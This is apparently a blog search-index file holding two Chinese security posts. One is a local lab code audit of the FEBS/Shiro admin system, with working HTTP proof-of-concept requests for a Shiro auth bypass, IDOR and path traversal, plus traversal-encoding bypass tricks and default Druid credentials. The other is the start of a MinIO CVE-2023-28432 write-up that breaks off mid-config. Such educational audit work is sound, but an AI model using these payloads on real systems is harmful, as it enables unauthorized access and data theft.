<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>FEBS后台管理系统代码审计</title>
    <link href="/2024/03/17/FEBS%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/03/17/FEBS%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h1><h2 id="下载源码："><a href="#下载源码：" class="headerlink" title="下载源码："></a>下载源码：</h2><p>下载文件<a href="https://github.com/jackliu-hao/shiro_boot----">jackliu-hao&#x2F;shiro_boot—-: shiro_boot代码审计 (github.com)</a></p><h2 id="Oracle安装："><a href="#Oracle安装：" class="headerlink" title="Oracle安装："></a>Oracle安装：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -p 1521:1521 \--name oracle11g \registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g <br></code></pre></td></tr></table></figure><p>进入容器<code>docker exec oracle_11g -it bash </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#进入容器</span><br>su root  <span class="hljs-comment">#密码 helowin</span><br><span class="hljs-comment">#编辑profile文件配置ORACLE环境变量:</span><br>vi /etc/profile  <br><span class="hljs-comment">#添加如下内容</span><br><span class="hljs-built_in">export</span> ORACLE_HOME=/home/oracle/app/oracle/product/11.2.0/dbhome_2export ORACLE_SID=helowinexport PATH=<span class="hljs-variable">$ORACLE_HOME</span>/bin:<span class="hljs-variable">$PATH</span>  <br><span class="hljs-comment">#更新环境变量</span><br><span class="hljs-built_in">source</span> /etc/profile  <br><span class="hljs-comment">#创建软连接：</span><br><span class="hljs-built_in">ln</span> -s <span class="hljs-variable">$ORACLE_HOME</span>/bin/sqlplus /usr/bin <br><span class="hljs-comment">#切换到oracle</span><br>su - oracle<br><span class="hljs-comment">#登录sqlplus并修改sys、system用户密码</span><br>sqlplus /nolog                                                 <span class="hljs-comment"># 登录oracle</span><br>conn /as sysdba                                                <span class="hljs-comment"># 连接,需要进行操作系统验证，才可进行连接登录</span><br>alter user system identified by [你的密码];                     <span class="hljs-comment"># 修改system用户账号密码</span><br>alter user sys identified by [你的密码];                            <span class="hljs-comment"># 修改sys用户账号密码</span><br>ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;      <span class="hljs-comment"># 修改密码规则策略为密码永不过期</span><br><span class="hljs-built_in">exit</span>;                                                          <span class="hljs-comment"># 退出</span><br></code></pre></td></tr></table></figure><p> oralce的其他命令：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;<span class="hljs-comment">#补充命令</span><br>&gt;<span class="hljs-comment">#登录sqlplus并修改sys、system用户密码: 需要注意的是再oracle用户下操作</span><br>&gt;sqlplus /nolog                                      <span class="hljs-comment"># 登录</span><br>&gt;conn /as sysdba                                     <span class="hljs-comment"># 连接</span><br>&gt;create user <span class="hljs-built_in">test</span> identified by <span class="hljs-built_in">test</span>;                <span class="hljs-comment"># 创建内部管理员账号密码；</span><br>&gt;grant connect,resource,dba to yan_test;             <span class="hljs-comment"># 将dba权限授权给内部管理员账号和密码；</span><br>&gt;alter system <span class="hljs-built_in">set</span> processes=1000 scope=spfile;       <span class="hljs-comment"># 修改数据库最大连接数据；#修改以上信息后，需要重新启动数据库</span><br>&gt;shutdown immediate;                                 <span class="hljs-comment"># 关闭数据库</span><br>&gt;startup;                                            <span class="hljs-comment"># 启动数据库</span><br>&gt;<span class="hljs-keyword">select</span> instance from v<span class="hljs-variable">$thread</span>;                      <span class="hljs-comment"># 查看数据库sid(实例名)</span><br>&gt;clear SCR  或 clear screen 或 clea scre              <span class="hljs-comment"># sqlplus清屏命令#创建表空间</span><br>&gt;create tablespace pts datafile <span class="hljs-string">&#x27;/home/oracle/app/oracle/oradata/helowin/pts.dbf&#x27;</span> size 100m autoextend on next 10m<br>&gt;drop tablespace PTS;                                <span class="hljs-comment"># 删除表空间</span><br>&gt;<span class="hljs-keyword">select</span> tablespace_name from dba_tablespaces;        <span class="hljs-comment"># 查看所有表空间</span><br>&gt;create user PTS identified by PTS default tablespace PTS;  <span class="hljs-comment"># 创建用户</span><br>&gt;drop user pts cascade;                              <span class="hljs-comment"># 删除用户</span><br>&gt;SQL&gt; grant sysdba to sys;                           <span class="hljs-comment"># 为sys用户添加sysdba权限</span><br>&gt;<span class="hljs-keyword">select</span> * from dba_role_privs <span class="hljs-built_in">where</span> granted_role=<span class="hljs-string">&#x27;DBA&#x27;</span>; <span class="hljs-comment"># 查看哪些用户被授予DBA权限</span><br>&gt;SQL&gt; <span class="hljs-keyword">select</span> userenv(<span class="hljs-string">&#x27;language&#x27;</span>) from dual;          <span class="hljs-comment"># 查看数据库编码</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="Oracle连接："><a href="#Oracle连接：" class="headerlink" title="Oracle连接："></a>Oracle连接：</h2><p>当执行了上面的命令，修改system用户密码为system后，查看数据库的sid（实例名）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> instance from v<span class="hljs-variable">$thread</span>;<br></code></pre></td></tr></table></figure><p>idea连接：<code>jdbc:oracle:thin:@[host]:[port]:[sid]</code></p><p>如图所示：</p><p><img src="/./../blog_image/image-20240316101955227.png" alt="image-20240316101955227"></p><p>连接即可。</p><h1 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h1><h2 id="1-验证码复用："><a href="#1-验证码复用：" class="headerlink" title="1. 验证码复用："></a>1. 验证码复用：</h2><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p><img src="/./../blog_image/image-20240316103739741.png" alt="image-20240316103739741"></p><p>抓包后修改账号和密码发现验证码存在复用情况，因此可以尝试爆破出账号和密码。</p><p>我们还看到登录中选择记住我后，存在<code>rememberMe</code>字段，因此可以推断出使用了shiro的鉴权中间件。</p><h3 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h3><p>查看登录接口：</p><p><img src="/./../blog_image/image-20240316114434386.png" alt="image-20240316114434386"></p><p>主要是调用了生成验证码接口后保存在session中，在登陆的时候尝试获取session中的验证码然后进行比较。</p><p>如果验证码错误则直接跳出，返回验证码错误了，而不是重新刷新验证码。正确的做法是使当前验证码失效，然后抛出错误，重新调用验证码接口。</p><h2 id="2-druid泄露："><a href="#2-druid泄露：" class="headerlink" title="2. druid泄露："></a>2. druid泄露：</h2><p>访问<code>/druid/index.html</code>，存在无需登录即可访问druid管理后台。</p><p>一般登录账号密码是<code>druid</code>，<code>druid123</code>。</p><p><img src="/./../blog_image/image-20240316115305210.png" alt="image-20240316115305210"></p><p>由于这里使用了shiro的session来管理，而不是使用request中的session，因此点击session监控是查看不到当前保存的session的。</p><p>如果获取了session，可以保存所有session，然后使用burp进行爆破，可以尝试无感知登录。</p><h2 id="3-shiro中间件漏洞："><a href="#3-shiro中间件漏洞：" class="headerlink" title="3. shiro中间件漏洞："></a>3. shiro中间件漏洞：</h2><h3 id="shiro反序列化rce："><a href="#shiro反序列化rce：" class="headerlink" title="shiro反序列化rce："></a>shiro反序列化rce：</h3><p>看到<code>rememberMe</code>直接梭哈：</p><p><img src="/./../blog_image/image-20240316135506959.png" alt="image-20240316135506959"></p><p>直接梭哈成功：</p><p><img src="/./../blog_image/image-20240316135522553.png" alt="image-20240316135522553"></p><h3 id="未授权访问："><a href="#未授权访问：" class="headerlink" title="未授权访问："></a>未授权访问：</h3><h4 id="漏洞复现：-1"><a href="#漏洞复现：-1" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>查看shiro版本：<code>1.4.0</code></p><p><img src="/./../blog_image/image-20240316135647209.png" alt="image-20240316135647209"></p><p>存在可以绕过shiro授权，具体方法是</p><p><strong>SpringBoot(Tomcat)和Shiro对URL处理的差异化</strong></p><table><thead><tr><th>漏洞编号</th><th>CVE-2020-1957</th><th>CVE-2020-11989</th><th>CVE-2020-13933</th></tr></thead><tbody><tr><td>影响版本</td><td>Apache Shiro &lt; 1.5.1</td><td>Apache Shiro &lt; 1.5.2</td><td>Apache Shiro &lt; 1.6</td></tr><tr><td>payload</td><td>&#x2F;xxxx&#x2F;..;&#x2F;admin&#x2F;</td><td>&#x2F;;&#x2F;test&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr><tr><td>Shrio 处理结果</td><td>&#x2F;xxxx&#x2F;..</td><td>&#x2F;</td><td>&#x2F;admin&#x2F;</td></tr><tr><td>SpringBoot 处理结果</td><td>&#x2F;admin&#x2F;</td><td>&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr></tbody></table><p>查看shiro中的配置内容：</p><p><img src="/./../blog_image/image-20240316141817569.png" alt="image-20240316141817569"></p><p>主要存在<code>/js/**</code>的路径都可以匿名访问，根据CVE-2020-1957，我们请求<code>/js/..;/user/list</code>，shiro则会处理成<code>/js/..</code>，而sb则会处理成<code>/user/list</code>。<code>map.put(&quot;/**&quot;,&quot;user&quot;)</code>表示的是其他路径被配置为需要用户身份验证的请求。</p><p>根据这个可以构造以下poc：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/js/..;/user/list?pageSize=10&amp;pageNum=1&amp;username=&amp;ssex=&amp;status=&amp;_=1710569357397</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json, text/javascript, */*; q=0.01<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p>实现了匿名访问：</p><p><img src="/./../blog_image/image-20240316142017981.png" alt="image-20240316142017981"></p><h4 id="代码审计：-1"><a href="#代码审计：-1" class="headerlink" title="代码审计："></a>代码审计：</h4><p>在<code>WebUtils</code>这个类中存在<code>decodeAndCleanUriString()</code>方法</p><p><img src="/./../blog_image/image-20240316155232928.png" alt="image-20240316155232928"></p><p>shiro鉴权中，调用了<code>decodeAndCleanUriString</code>，主要逻辑是获取<code>;</code>的索引然后判断是否存在，如果存在则截取<code>;</code>前的路径，否则直接返回。</p><p><img src="/./../blog_image/image-20240316155509117.png" alt="image-20240316155509117"></p><p>然后调用<code>PathMatchingFilterChainResolver</code>中的<code>getChain</code>方法，获取对应的filter过滤器：</p><p>当前匹配路径<code>/js/..;/user/list</code>会被处理成<code>/js/..</code>，由于<code>/js/**</code>是匿名访问，因此绕过了shiro的鉴权。</p><p><img src="/./../blog_image/image-20240316155833295.png" alt="image-20240316155833295"></p><p>在<code>getPathWithinServletMapping</code>中调用了<code>getPathWithinApplication</code>：</p><p><img src="/./../blog_image/image-20240316162944179.png" alt="image-20240316162944179"></p><p>这个方法主要是去除路径的<code>;</code>，把<code>//</code>替换成<code>/</code>：</p><p><img src="/./../blog_image/image-20240316162309998.png" alt="image-20240316162309998"></p><p><code>getRequestUri</code>中调用了<code>decodeAndCleanUriString</code>方法：</p><p><img src="/./../blog_image/image-20240316162139198.png" alt="image-20240316162139198"></p><p>这一步处理完就成了<code>/js/../user/list</code></p><p>然后继续调用<code>getPathWithinServletMapping</code>中的<code>getServletPath</code>方法，这个方法主要是获取servlet请求路径，这里明细了<code>/foo/</code>会被处理成<code>/foo</code>。</p><p>最终<code>/js/../user/list</code>会处理成<code>/user/list</code></p><h2 id="4-越权访问："><a href="#4-越权访问：" class="headerlink" title="4. 越权访问："></a>4. 越权访问：</h2><h3 id="获取用户信息："><a href="#获取用户信息：" class="headerlink" title="获取用户信息："></a>获取用户信息：</h3><h4 id="漏洞复现：-2"><a href="#漏洞复现：-2" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/user/getUserProfile</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>9<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded; charset=UTF-8<br><span class="hljs-attribute">X-Requested-With</span><span class="hljs-punctuation">: </span>XMLHttpRequest<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://localhost<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>cors<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>empty<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=942618d6-cb52-4ad4-bf48-4b35d4bfe8ce<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-abnf"><span class="hljs-attribute">userId</span><span class="hljs-operator">=</span><span class="hljs-number">41</span></span><br></code></pre></td></tr></table></figure><h4 id="代码审计：-2"><a href="#代码审计：-2" class="headerlink" title="代码审计："></a>代码审计：</h4><p>查看controller接口：</p><p><img src="/./../blog_image/image-20240316171137347.png" alt="image-20240316171137347"></p><p>可以看到查询个人信息的接口是传入id的，而且是不加以权限的，因此可以实现越权查询其他人的信息，如图所示：</p><p><img src="/./../blog_image/image-20240316171641975.png" alt="image-20240316171641975"></p><p>正确的做法应该是从session中获取当前登录的用户id，然后再查询，而不是由前端传入当前用户的id。</p><h3 id="更改任意用户信息："><a href="#更改任意用户信息：" class="headerlink" title="更改任意用户信息："></a>更改任意用户信息：</h3><h4 id="漏洞复现：-3"><a href="#漏洞复现：-3" class="headerlink" title="漏洞复现："></a>漏洞复现：</h4><p>点击个人信息，抓包：</p><p><img src="/./../blog_image/image-20240317102553499.png" alt="image-20240317102553499"></p><p>将用户名和id填写上去，可以修改任意用户的信息：</p><p><img src="/./../blog_image/image-20240317102916819.png" alt="image-20240317102916819"></p><p>可以修改当前的状态。</p><h4 id="代码审计：-3"><a href="#代码审计：-3" class="headerlink" title="代码审计："></a>代码审计：</h4><p>查看service层接口：</p><p><img src="/./../blog_image/image-20240317103010518.png" alt="image-20240317103010518"></p><p>这里将用户名和密码设置为null，然后调用<code>updateNotNull</code>方法，因此这个接口不能修改当前用户名称和密码。</p><p><code>updateNotNull</code>调用了<code>updateByPrimaryKeySelective</code>，即只修改修改过的值。</p><p><img src="/./../blog_image/image-20240317103104649.png" alt="image-20240317103104649"></p><p>可以看到没有对user实体类的数据进行过滤，从而实现修改任意用户的信息，这里我修改了当前用户的状态，令修改的用户不能登录。</p><p><img src="/./../blog_image/image-20240317103332406.png" alt="image-20240317103332406"></p><p>修复建议：</p><p>应该获取当前登录的用户，然后只修改当前用户信息，而不是从前端传入数据去修改。如果从前端获取的数据，应该判断需要修改的用户是否是当前登录的用户。</p><h2 id="5-任意文件下载："><a href="#5-任意文件下载：" class="headerlink" title="5. 任意文件下载："></a>5. 任意文件下载：</h2><h3 id="漏洞复现：-4"><a href="#漏洞复现：-4" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p>目录穿越：</p><p>这个的fileName没有进行校验，所以导致了目录穿越。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/common/download?fileName=../../../../../../../../boot.ini&amp;delete=true</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;121&quot;, &quot;Not A(Brand&quot;;v=&quot;99&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>same-origin<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://localhost/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=64231f02-080f-4fc2-aa56-ea286d532edf; rememberMe=T6B6VwfR1+Log+OLbsQ8dSGJX/7MsQC8ZpJvEEnegX7/uOvU0fFbgSuE/YzHR3pb9nAWS71q5O6IZY9ikoh2fLGPO+YUkTXKmnJVQOlqSFFrhxUk4fJsrvSwf674TrycHnatAWeahQKCbCi/hqDgHTHVca/Wq2JljjcEtGUnLrXZkLNBqOtm7zvGjv+JXWetUQR0cfiDM/ANn3Y/gAeG9T0JYtM5W8Vekp0o6QNvC0ZETZV1d8ZEZJR/SDwtoEmB8cViGjMbFNODPlyB0+S5mwRhNuMwx3fGENJXmCONq0B4pFGDNno6a/HijoscKhW94rQJOdHDz8bkfvcUYYJUNemvMyjKliJEGDyMy7bpMyRqPMNHkCVGaLftLEoXympTrpSz/7AUrqLXdzxcWk8DCOkSXUO1IntdkXeu/X7X9Maefkw9b4nnLIb4IrOhQJiDN7UIJ4Trb8riXeotSzX5tOdtAj87Y7GHdl/gYcZgMH8RHOdj3mUdimjf2pcwlVhZApokeox7iEsSQLBf9f+CXEhPbJNpDPWwdZrNUu3RqAy21vNkcGO7tWXZu67mMpgVEa73/NMRtKkR5Kw1JwjItEhL5yU/cOW8tbpziAfTkMejL0/2UMApQseIqCWyJfB3v+PxJePAbSQoMJTiVCviwrYW0WIyRF6gigmiSHaH4k+ERppDNKXet485wwPLDiOVmYFGyLEAx+ka9QQCEw+q0Xy9Zt7YrE0iv2kuzVhB1Legh5XwMdGjSAXNzQXN+MnzizPzkLl0bb/d380KEC0Vx5v1cyISiwvLIbFAZajfuGLQGuoqIZHzUy3kYLnsSzXX/gxSWnB29C0SB8+8XktZ6Hra8FKQkLB4hBmHTjwIvO6l2GnWRC2g3FyfLMvtsVUeaFaf2APZaPsC9Wj+DxL423Z64oGUGsHCw2FNLOZYVPFGFjQHAd26VarIARWPnn5lyvE6Ap+GEAZSkcrvGiAq2djWiZHvKkUbYYBek8Ll+JWdKUezU2AODjO7OKODUr/WoewBKA5IVOtxULyOzyhBZVeyFTt5olXI6ZDy6ZTxt5MJGGpKp+XnxXpiMjY224GVQYpq2q8vUqp07w2E08lr0ed3tAXvC79WivCgfgUOXKx+d5TeTrGU9TXpV27lBY6HSdxyqLtNO5VTDhKdV8e3Gx0A31hO2WU8KJmIIQKPC7Id217i5QTdtQvYJa5PC03VdI4JmEBuzTrZxdtHL7qz6/6rcGGwsn7Psksg/Pl9sIpT34sC1VRauIvXhjR5c7m3RJFjo7BG126XyULyv4GNEcngJcor8rOXJ0qeEF47J9OoB57XRIgmu3n0XD/Wi+EojJQuVPKW4T6ntr3675vjHNRHSV0JP7BwiC8lABjIS8I0pj8A07TgFq30SvbC4sLnS3OB1M6aJjvZ2vN4kzaPty/VB4O0ml57r8u0j42Udbg=<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><br></code></pre></td></tr></table></figure><p>可以读取任意文件：</p><p><img src="/./../blog_image/image-20240317111025663.png" alt="image-20240317111025663"></p><p><strong>目录穿越绕过方案</strong></p><ol><li>进行URL编码：点–&gt;%2e 反斜杠–&gt;%2f 正斜杠–&gt;%5c</li></ol><p>..&#x2F;  –&gt;  %2e%2e%2f</p><ol><li>进行16为Unicode编码：点–&gt;%u002e 反斜杠–&gt;%u2215 正斜杠–&gt;%u2216</li></ol><p>%u002e%u002e%u2215文件名</p><ol><li>进行双倍URL编码：点–&gt;%252e 反斜杠–&gt;%u252f 正斜杠–&gt;%u255c</li><li>进行超长UTF-8 Unicode编码：</li></ol><ul><li>点–&gt;%c0%2e %e0$40%ae %c0ae</li><li>反斜杠–&gt;%c0af %e0%80af %c0%af</li><li>正斜杠–&gt;%c0%5c %c0%80%5c</li></ul><h3 id="代码审计：-4"><a href="#代码审计：-4" class="headerlink" title="代码审计："></a>代码审计：</h3><p>这里主要用到了<code>FileInputStream</code>去读取文件，java中的目录穿越是原生的，支持这种<code>../</code>目录。</p><p><img src="/./../blog_image/image-20240317110514579.png" alt="image-20240317110514579"></p><p>修复建议：</p><p>对传入的文件名需要进行判断，对于<code>../</code>这种的文件名需要进行拦截操作。</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>minio从信息泄漏到RCE</title>
    <link href="/2023/12/26/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/"/>
    <url>/2023/12/26/minio%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/</url>
    
    <content type="html"><![CDATA[<h1 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h1><p>Minio 是个基于 Golang 编写的开源对象存储套件，虽然轻量，却拥有着不错的性能。</p><p>minio存在漏洞利用，本次漏洞为<code>CVE-2023-28432</code>。</p><p>官方在 <a href="https://github.com/minio/minio/pull/8550">https://github.com/minio/minio/pull/8550</a> 中引入bootstrap API 并于 RELEASE.2019-12-17T23-16-33Z发布，用于验证服务器配置。在其<code>RELEASE.2023-03-20T20-16-18Z</code>版本（不含）以前，集群模式部署下存在一处信息泄露漏洞，攻击者可以通过发送一个POST数据包获取进程所有的环境变量，其中就包含账号密码<code>MINIO_SECRET_KEY</code>和<code>MINIO_ROOT_PASSWORD</code>。</p><p>本次漏洞复现，需要使用到分布式部署。在单机情况下，复现失败。</p><p>注意点：</p><blockquote><p>版本号检测：</p><p>1.http-&gt; Get &#x2F;api&#x2F;v1&#x2F;check-version</p><p>2.版本小于RELEASE.2023-03-20T20-16-18Z则存在漏洞。</p><p>信息泄露：</p><p>POST &#x2F;minio&#x2F;bootstrap&#x2F;v1&#x2F;verify HTTP&#x2F;1.1</p></blockquote><h1 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h1><p>参考<code>vulhub</code>的dockerfile:</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">version: <span class="hljs-string">&#x27;3&#x27;</span><br>services:<br>  node1:<br>    image: vulhub/minio:<span class="hljs-number">2023</span>-<span class="hljs-number">02</span>-<span class="hljs-number">27</span>T18-<span class="hljs-number">10</span>-<span class="hljs-number">45</span>Z<br>    environment:<br>      - MINIO_ROOT_USER=minioadmin<br>      - 